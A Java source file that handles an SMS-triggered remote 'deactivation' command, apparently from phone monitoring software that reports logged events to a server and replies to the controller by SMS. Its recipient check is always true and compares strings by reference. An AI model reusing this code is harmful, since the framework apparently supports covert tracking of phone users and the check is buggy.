package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendDeactivateCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendDeactivateManager;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSDeactivation extends RmtCmdAsync implements PhoenixProtocolListener {

	private SendDeactivateManager deactManager = Global.getSendDeactivateManager();
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSDeactivation(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		if (rmtCmdLine.getRecipientNumber() != null || rmtCmdLine.getRecipientNumber() != "") {
			smsMessage.setNumber(rmtCmdLine.getRecipientNumber());
		}
	}
	
	// Runnable
	public void run() {
		doSMSHeader(smsCmdCode.getDeactivationCmd());
		deactManager.addListener(this);
		deactManager.deactivate();
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		deactManager.removeListener(this);
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// TODO: Issue: 595, After deactivated, all events should be remove
		// Root cause: After deactivated, database will be reset 
		// So should not to save this system event that will be saved into database as 1st event.
		// To create system event.
//		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	public void onSuccess(CommandResponse response) {
		deactManager.removeListener(this);
		if (response instanceof SendDeactivateCmdResponse) {
			SendDeactivateCmdResponse sendDeactRes = (SendDeactivateCmdResponse)response;
			if (sendDeactRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.PROD_DEACTIVATED);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendDeactRes.getServerMsg());
			}
			// TODO: Issue: 595, After deactivated, all events should be remove
			// Root cause: After deactivated, database will be reset 
			// So should not to save this system event that will be saved into database as 1st event.
			// To create system event.
//			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdDeactivation.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
